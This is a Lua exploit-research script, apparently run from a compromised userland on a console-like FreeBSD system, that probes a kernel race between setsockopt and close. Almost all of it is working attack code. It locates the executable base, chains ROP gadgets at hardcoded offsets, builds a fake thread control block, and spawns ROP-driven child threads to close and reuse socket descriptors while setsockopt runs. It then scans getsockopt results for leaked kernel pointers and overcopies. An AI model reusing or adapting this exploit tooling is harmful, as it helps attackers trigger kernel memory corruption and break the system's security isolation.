-- CRASH_CLASS: MODERATE
-- PROBE 397e: setsockopt + close race from concurrent child threads
--
-- setsockopt works on fresh instances. Two child threads race:
-- Thread A: loops setsockopt(SO_RCVBUF) on socket fd
-- Thread B: busy-waits then close(fd) + open new socket (fd reuse)
-- If setsockopt handler drops the lock during copyin, close can free the
-- socket struct while setsockopt is mid-operation. Repeat N times.
-- Monitor: kernel pointer in read-back, unexpected return values, crash.

print("=== PROBE 397e: sockopt+close race ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi = eb_hi
    if lo >= 0x100000000 then hi = hi + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi
end

-- Gadgets
local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local pop_r8_ret  = g(0x991)
local mov_rdi_rax = g(0x92C67) -- mov [rdi], rax; ret
local bare_ret    = g(0x42)

-- Signal ignore
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Shared state
local shared = memory.alloc(0x100)
for i = 0, 0xFC, 4 do wd(N(shared) + i, 0) end
local RACE_COUNT = 50

-- For each race iteration:
-- 1. Main thread creates a TCP socket
-- 2. Thread A: loops setsockopt(SO_RCVBUF) RACE_INNER times, stores ret count
-- 3. Thread B: busy-waits, then close(fd), stores close ret
-- 4. Main thread checks results, creates new socket

-- But we can only spawn threads once per connection and they don't loop easily
-- without the pop_rsp loop machinery. Simpler approach:
-- One child does setsockopt in a pop_rsp loop
-- Main thread does close after a delay

-- Even simpler: main thread races close vs setsockopt from make_syscall
-- setsockopt via mk(105) blocks until done. So we can't race from main thread.

-- Best approach: child does setsockopt loop, main does close
-- Use the disposable trampoline pattern from 395g for the child loop

-- Actually simplest: just do many iterations from main thread
-- Create socket → setsockopt from main → close → check anomaly
-- The race is between the kernel's internal setsockopt processing and
-- a child thread's close on the same fd.

-- Setup: child thread that closes fd N after a spin
-- Main thread: create socket (gets fd N), immediately call setsockopt
-- Child: spin then close fd N
-- Check: setsockopt return value, getsockopt readback, kernel pointer scan

-- Shared: +0x00 = child done flag
--         +0x04 = close return value
--         +0x08-0x0C = target fd (written by main, read by child)
--         +0x10 = race counter
--         +0x40 = anomaly count
--         +0x44 = setsockopt success count
--         +0x48 = setsockopt fail count
--         +0x80 = getsockopt anomaly buffer (up to 8 values)

-- Fake TCB for child
local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

print("")
print(string.format("running %d race iterations", RACE_COUNT))

local anomalies = 0
local so_ok = 0
local so_fail = 0
local kptr_count = 0

for iter = 1, RACE_COUNT do
    -- Create socket
    local ok_s, rv_s = pcall(function()
        return mk(97)(uint64(2), uint64(1), uint64(6))
    end)
    local fd = ok_s and N(rv_s) or -1
    if fd < 0 then break end

    -- Optval buffer
    local optbuf = memory.alloc(16)
    wd(N(optbuf), 65536) -- SO_RCVBUF = 64K

    -- Build child chain: spin + close(fd)
    local CHILD_STK_SIZE = 0x200
    local child_stk = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(child_stk) + i, 0) end
    local child_base = N(child_stk)
    local child_rsp = ((child_base + CHILD_STK_SIZE) - ((child_base + CHILD_STK_SIZE) % 16)) - 8

    local sp = child_rsp
    local function push(val) wq(sp, val); sp = sp + 8 end

    -- sysarch(SET_FSBASE=129)
    push(uint64(165)) -- padding (return addr)
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub) -- sysarch

    -- Tiny spin (allow main thread to start setsockopt first)
    -- Just a few nops via ret gadget chain
    for i = 1, 30 do push(bare_ret) end

    -- close(fd)
    push(pop_rax_ret); push(uint64(6))
    push(pop_rdi_ret); push(uint64(fd))
    push(pop_rsi_ret); push(uint64(0))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub) -- close

    -- Store close return to shared+0x04
    push(pop_rdi_ret); push(uint64(N(shared) + 0x04))
    push(mov_rdi_rax)

    -- Immediately open a new socket on the freed fd slot
    push(pop_rax_ret); push(uint64(97))
    push(pop_rdi_ret); push(uint64(2))
    push(pop_rsi_ret); push(uint64(1))
    push(pop_rdx_ret); push(uint64(6))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)
    -- store new fd
    push(pop_rdi_ret); push(uint64(N(shared) + 0x08))
    push(mov_rdi_rax)

    -- Mark done
    push(pop_rdi_ret); push(uint64(N(shared)))
    push(pop_rax_ret); push(uint64(0xDDDD))
    push(mov_rdi_rax)

    -- thr_exit
    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    -- Launch child
    wd(N(shared), 0)
    wd(N(shared) + 4, 0xFF)
    wd(N(shared) + 8, 0xFF)

    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    local sf_lo, sf_hi = g_lohi(0x992) -- pop_rax; ret
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, child_base % 0x100000000, math.floor(child_base / 0x100000000))
    w64(N(pa) + 0x18, CHILD_STK_SIZE, 0)

    local ok_t, rv_t = pcall(function()
        return mk(455)(uint64(N(pa)), uint64(0x38))
    end)

    -- IMMEDIATELY call setsockopt on the fd (racing with child's close)
    local ok_so, rv_so = pcall(function()
        return mk(105)(uint64(fd), uint64(0xFFFF), uint64(0x1002),
            uint64(N(optbuf)), uint64(4))
    end)
    local so_ret = ok_so and N(rv_so) or -999

    -- Also do getsockopt to check for leaked data
    local gbuf = memory.alloc(32)
    for i = 0, 28, 4 do wd(N(gbuf) + i, 0xCC) end
    local glenp = memory.alloc(8)
    wq(glenp, uint64(32))
    local ok_g, rv_g = pcall(function()
        return mk(118)(uint64(fd), uint64(0xFFFF), uint64(0x1002),
            uint64(N(gbuf)), uint64(N(glenp)))
    end)
    local g_ret = ok_g and N(rv_g) or -999
    local g_val = rd(N(gbuf)) or 0xCC

    -- Wait for child
    local dummy = 0
    for i = 1, 100000 do dummy = dummy + 1 end

    -- Check results
    local child_done = rd(N(shared)) or 0
    local close_ret_lo = rd(N(shared) + 4) or 0xFF
    local new_fd = rd(N(shared) + 8) or 0xFF

    if so_ret == 0 then so_ok = so_ok + 1 else so_fail = so_fail + 1 end

    -- Check getsockopt for kernel pointer
    local glen = rd(N(glenp)) or 0
    if glen > 4 then
        -- Got more data than expected — overcopy!
        anomalies = anomalies + 1
        print(string.format("[%d] OVERCOPY! len=%d so=%d g=%d val=%08X",
            iter, glen, so_ret, g_ret, g_val))
    end

    -- Check all returned dwords for kernel pointers
    for off = 0, 28, 4 do
        local dw = rd(N(gbuf) + off) or 0
        if dw >= 0xFFFF8000 and dw ~= 0xFFFFFFFF then
            kptr_count = kptr_count + 1
            if kptr_count <= 5 then
                print(string.format("[%d] KPTR at +%d: %08X", iter, off, dw))
            end
        end
    end

    -- Check for anomalous return values
    if so_ret ~= 0 and so_ret ~= -1 and so_ret ~= -999 then
        anomalies = anomalies + 1
        print(string.format("[%d] ANOMALY: so_ret=%d", iter, so_ret))
    end

    -- Close any remaining fds
    pcall(function() mk(6)(uint64(fd)) end)
    if new_fd ~= 0xFF and new_fd ~= fd then
        pcall(function() mk(6)(uint64(new_fd)) end)
    end

    if not alive() then print("CANARY FAIL at iter " .. iter); break end
end

print(string.format("done: ok=%d fail=%d anomalies=%d kptr=%d",
    so_ok, so_fail, anomalies, kptr_count))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 397e COMPLETE ===")
